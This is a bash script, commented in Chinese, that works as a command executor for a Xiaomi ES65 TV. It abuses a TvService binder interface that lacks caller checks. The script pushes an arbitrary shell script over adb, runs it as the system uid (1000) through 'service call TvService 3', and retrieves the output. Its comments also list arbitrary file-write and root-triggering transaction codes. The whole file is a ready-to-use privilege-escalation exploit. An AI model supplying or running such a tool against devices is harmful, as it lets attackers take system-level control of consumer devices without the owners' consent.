#!/bin/bash
# ============================================================
# 小米电视 ES65 —— system_app (uid 1000, u:r:system_app:s0) 命令执行器
#
# 原理: TvService (android.uid.system) 的 ITvService AIDL Stub 无调用方校验:
#   code 1 = systemPropertiesSet(String k, String v)   # 受 SELinux 限属性范围
#   code 2 = writeSystemFile(String path, String content)  # 任意文件写
#   code 3 = runSystemCommand(String cmd)              # 任意命令执行(无 shell, 需空格分词)
#   code 4400 = MITV_SERVICE_MISYSDIAGNOSE -> 触发 init 以 uid0(misysdiagnose域)执行脚本
#
# 用法: ./sysapp.sh 'id; ls -la /dev'
# ============================================================
A=/d/Tools/platform-tools/adb.exe
D=192.168.1.164:5555
WRK="D:/Work/WorkBuddy/.tools/tv"

if [ -z "$1" ]; then echo "用法: $0 '<命令>'"; exit 1; fi

{
  echo 'export PATH=/system/bin:/vendor/bin:/system/xbin:$PATH'
  echo '{'
  echo "$1"
  echo '} > /sdcard/sa_out.txt 2>&1'
} > "$WRK/sa.sh"

"$A" -s "$D" push "$WRK/sa.sh" /sdcard/sa.sh >/dev/null 2>&1
"$A" -s "$D" shell 'rm -f /sdcard/sa_out.txt' >/dev/null 2>&1
"$A" -s "$D" shell 'service call TvService 3 s16 "/system/bin/sh /sdcard/sa.sh"' >/dev/null 2>&1
sleep 3
"$A" -s "$D" pull /sdcard/sa_out.txt "$WRK/sa_out.txt" >/dev/null 2>&1
echo "=========== system_app (uid1000) 执行结果 ==========="
cat "$WRK/sa_out.txt" 2>/dev/null | tr -d '\000'
echo "===================================================="
